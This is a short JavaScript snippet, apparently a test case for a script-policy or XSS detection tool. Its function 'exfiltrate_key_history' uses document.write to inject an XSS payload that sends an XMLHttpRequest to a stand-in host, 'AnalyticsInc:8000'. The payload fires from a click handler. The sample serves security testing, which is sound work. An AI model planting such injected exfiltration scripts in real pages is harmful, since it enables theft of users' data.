function exfiltrate_key_history() {
  var URL = '<IMG """><SCRIPT>xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=xss6", true);xmlhttp.send(null);\x3c/SCRIPT>">';
  JAM.call(document.write, document, [URL]);
  return
}
var v0 = document.getElementById("test");
JAM.set(v0, "onclick", exfiltrate_key_history);
